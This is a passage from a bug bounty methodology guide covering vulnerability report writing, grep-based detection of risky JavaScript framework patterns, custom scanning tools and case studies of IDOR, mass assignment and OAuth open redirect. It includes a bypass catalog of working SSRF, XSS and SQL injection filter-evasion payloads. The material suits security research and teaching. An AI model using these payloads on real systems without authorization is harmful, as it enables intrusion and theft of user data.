### 12.2 Report Writing Tips

1. **Be clear and concise** - Triagers read many reports
2. **Show, don't tell** - Include PoC code and screenshots
3. **Focus on impact** - What can an attacker achieve?
4. **Provide context** - Help triagers understand the vulnerability
5. **Be professional** - No memes, no attitude

### 12.3 Pre-Submission Checklist

- [ ] Vulnerability is reproducible
- [ ] Impact is clearly demonstrated
- [ ] Steps to reproduce are complete
- [ ] Evidence is included (screenshots, requests)
- [ ] No false positives
- [ ] Not a duplicate
- [ ] Within scope
- [ ] Appropriate severity
- [ ] Report is well-written

---

## 13. Advanced Techniques

### 13.1 JavaScript Engine Analysis

```javascript
// Understanding V8 optimization
// 1. Look for deoptimization triggers
// 2. Find JIT-compiled functions
// 3. Analyze memory management

// Hidden class manipulation
// Look for: Object.defineProperty, Object.keys
// Potential: Hidden class pollution

// Prototype chain analysis
// Look for: __proto__, Object.getPrototypeOf
// Potential: Prototype pollution
```

### 13.2 WebAssembly Analysis

```javascript
// If WebAssembly is used:
// 1. Extract .wasm files
// 2. Analyze with wasm-decompile or wasm2wat
// 3. Look for vulnerabilities in native code

// Detection:
grep -r "WebAssembly\|wasm" js/
```

### 13.3 Service Worker Analysis

```javascript
// Service workers can:
// 1. Cache responses
// 2. Intercept requests
// 3. Handle push notifications

// Look for:
// - Cache poisoning
// - Request interception vulnerabilities
// - Push notification abuse

// Detection:
grep -r "serviceWorker\|sw\.js\|workbox" js/
```

### 13.4 Web Worker Analysis

```javascript
// Web Workers run in separate threads
// They can:
// 1. Process data in background
// 2. Access IndexedDB
// 3. Make network requests

// Look for:
// - Data leakage between workers
// - Shared memory vulnerabilities
// - PostMessage vulnerabilities

// Detection:
grep -r "Worker\|postMessage\|onmessage" js/
```

---

## 14. Framework-Specific Analysis

### 14.1 React/Next.js

```javascript
// React-specific vulnerabilities
// 1. dangerouslySetInnerHTML (XSS)
// 2. URL injection via React Router
// 3. State management vulnerabilities
// 4. Server-side rendering (SSR) issues

// Detection:
grep -n "dangerouslySetInnerHTML\|__html" js/
grep -n "useEffect\|useState\|useContext" js/
grep -n "getServerSideProps\|getStaticProps" js/
```

### 14.2 Vue/Nuxt

```javascript
// Vue-specific vulnerabilities
// 1. v-html directive (XSS)
// 2. Computed properties with side effects
// 3. Watcher vulnerabilities
// 4. Server-side rendering (SSR) issues

// Detection:
grep -n "v-html\|v-bind\|v-on" js/
grep -n "computed\|watch\|methods" js/
```

### 14.3 Angular

```javascript
// Angular-specific vulnerabilities
// 1. bypassSecurityTrust* functions (XSS)
// 2. Template injection
// 3. Dependency injection vulnerabilities
// 4. Zone.js manipulation

// Detection:
grep -n "bypassSecurityTrust" js/
grep -n "\[innerHTML\]\|\[outerHTML\]" js/
grep -n "@Injectable\|Inject" js/
```

### 14.4 Express.js

```javascript
// Express-specific vulnerabilities
// 1. Route parameter injection
// 2. Middleware vulnerabilities
// 3. Error handling information disclosure
// 4. Session management issues

// Detection:
grep -n "app\.\(get\|post\|put\|delete\)" js/
grep -n "middleware\|use(" js/
grep -n "req\.params\|req\.query\|req\.body" js/
```

---

## 15. Bypass Catalog

### 15.1 IP Filter Bypass

```bash
# Bypass 1: Decimal IP
http://2130706433 = http://127.0.0.1

# Bypass 2: Octal IP
http://0177.0.0.1 = http://127.0.0.1

# Bypass 3: Hex IP
http://0x7f.0x0.0x0.0x1 = http://127.0.0.1

# Bypass 4: Short notation
http://127.1 = http://127.0.0.1

# Bypass 5: DNS rebinding
# Use domain that resolves to 127.0.0.1

# Bypass 6: IPv6
http://[::1] = http://127.0.0.1

# Bypass 7: Enclosed IP
http://[::ffff:127.0.0.1]

# Bypass 8: URL encoding
http://%31%32%37%2e%30%2e%30%2e%31

# Bypass 9: Double encoding
http://%2531%2532%2537%252e%2530%252e%2530%252e%2531

# Bypass 10: Null byte
http://127.0.0.1%00.evil.com

# Bypass 11: DNS aliases
http://localtest.me (resolves to 127.0.0.1)
http://nip.io (wildcard DNS)
http://sslip.io (wildcard DNS)
```

### 15.2 XSS Filter Bypass

```bash
# Bypass 1: Case variation
<ScRiPt>
<sCrIpT>

# Bypass 2: Null bytes
<scr%00ipt>
<s\0cript>

# Bypass 3: HTML entities
&lt;script&gt;
&#x3C;script&#x3E;

# Bypass 4: Double encoding
%253Cscript%253E

# Bypass 5: Protocol handler
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# Bypass 6: SVG onload
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload=alert(1)>

# Bypass 7: Event handlers
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video onerror=alert(1)><source>

# Bypass 8: Encoding tricks
<a href="&#x6A;avascript:alert(1)">click</a>
<a href="java&#x73;cript:alert(1)">click</a>
```

### 15.3 SQL Injection Filter Bypass

```bash
# Bypass 1: Case variation
SeLeCt, uNiOn, iNsErT

# Bypass 2: Inline comments
SEL/**/ECT, UN/**/ION

# Bypass 3: URL encoding
%27%20OR%20%271%27%3D%271

# Bypass 4: Double encoding
%2527%2520OR%2520%25271%2527%253D%25271

# Bypass 5: Hex encoding
0x27204F5220273127

# Bypass 6: Char() function
CHAR(39)

# Bypass 7: Uncommon space characters
%09, %0a, %0b, %0c, %0d, %a0

# Bypass 8: Alternative syntax
HAVING, GROUP BY, ORDER BY
```

---

## 16. Tool Reference

### 16.1 deep-analyzer.ps1 (v3.0)

```powershell
# Basic usage
.\tools\deep-analyzer.ps1 -Path ./js -Output ./reports

# With specific patterns
.\tools\deep-analyzer.ps1 -Path ./js -Output ./reports -Patterns "innerHTML,eval"

# With custom output format
.\tools\deep-analyzer.ps1 -Path ./js -Output ./reports -Format json
```

### 16.2 pattern-tracer.ps1 (v3.0)

```powershell
# Trace XSS patterns
.\tools\pattern-tracer.ps1 -Source 'url_params' -Sink 'innerHTML' -Path ./js

# Trace SQL injection patterns
.\tools\pattern-tracer.ps1 -Source 'form_data' -Sink 'sql' -Path ./js

# Trace SSRF patterns
.\tools\pattern-tracer.ps1 -Source 'form_data' -Sink 'fetch' -Path ./js

# With max distance limit
.\tools\pattern-tracer.ps1 -Source 'cookies' -Sink 'eval' -Path ./js -MaxDistance 30
```

### 16.3 chain-builder.ps1 (v3.0)

```powershell
# Build chains from findings
.\tools\chain-builder.ps1 -FindingsPath './findings.json'

# Build chains with data flows
.\tools\chain-builder.ps1 -FindingsPath './findings.json' -FlowsPath './flows.json'

# Build chains with custom output
.\tools\chain-builder.ps1 -FindingsPath './findings.json' -Output './chains'
```

### 16.4 report-generator.ps1 (v3.0)

```powershell
# Generate HackerOne report
.\tools\report-generator.ps1 -FindingsPath './findings.json' -Platform 'hackerone'

# Generate Bugcrowd report
.\tools\report-generator.ps1 -FindingsPath './findings.json' -Platform 'bugcrowd'

# Generate Intigriti report
.\tools\report-generator.ps1 -FindingsPath './findings.json' -Platform 'intigriti'
```

### 16.5 hunt-master.ps1 (v3.0)

```powershell
# Full pipeline
.\tools\hunt-master.ps1 -Target 'example.com' -Output './reports'

# Skip specific stages
.\tools\hunt-master.ps1 -Target 'example.com' -SkipRecon -SkipTesting

# Custom platform
.\tools\hunt-master.ps1 -Target 'example.com' -Platform 'bugcrowd'
```

---

## 17. Real-World Case Studies

### 17.1 Case Study: GraphQL IDOR

**Target:** E-commerce platform
**Finding:** IDOR in order lookup endpoint

```graphql
query {
  order(id: "123") {
    id
    items
    total
    user {
      email
      address
    }
  }
}
```

**Analysis:**
1. Found `order` query in JavaScript bundle
2. Noticed `id` parameter was user-controlled
3. No authorization check visible in code
4. Tested with different IDs
5. Accessed other users' orders

**Impact:** High - Access to other users' order data including PII

### 17.2 Case Study: Payment Mutation Bypass

**Target:** Marketplace platform
**Finding:** Mass assignment in payment method creation

```graphql
mutation {
  createPaymentMethod(input: {
    cardNumber: "4242424242424242"
    expMonth: 12
    expYear: 2025
    cvv: "123"
    isDefault: true
    billingAddress: { ... }
  }) {
    id
    last4
  }
}
```

**Analysis:**
1. Found `createPaymentMethod` mutation in JavaScript
2. Noticed `paymentData` was `JSONString!` type (raw JSON)
3. Tested adding extra fields: `admin: true`, `verified: true`
4. Server accepted additional fields
5. Could set arbitrary properties on payment method

**Impact:** High - Potential to bypass payment verification

### 17.3 Case Study: OAuth Redirect URI Manipulation

**Target:** SaaS platform
**Finding:** Open redirect via OAuth callback

```javascript
// Found in auth callback handler
const redirect = params.get('redirect');
if (redirect && redirect.startsWith('/')) {
  window.location = redirect;
}
```

**Analysis:**
1. Found redirect parameter handling in auth code
2. Tested with: `redirect=//evil.com`
3. Browser followed protocol-relative URL
4. User redirected to attacker-controlled site
5. Could steal OAuth authorization codes

**Impact:** Medium - Account takeover via OAuth code theft

---

## Conclusion

This methodology provides a systematic approach to finding high-impact vulnerabilities through deep JavaScript code analysis. The key principles are:

1. **Follow the data** from source to sink
2. **Understand context** before declaring vulnerability
3. **Validate everything** with manual testing
4. **Build chains** for maximum impact
5. **Document thoroughly** for submission

The framework tools (`deep-analyzer.ps1`, `pattern-tracer.ps1`, `chain-builder.ps1`, `report-generator.ps1`, `hunt-master.ps1`) are designed to support this methodology at each phase.

**Remember:** Deep code analysis is a skill that improves with practice. The more JavaScript you read, the better you will become at identifying patterns and spotting vulnerabilities.

---

*Methodology Version: 3.0 (Mythos-Level)*
*Last Updated: 2026-06-15*
*Author: Bug Bounty Hunting Framework*
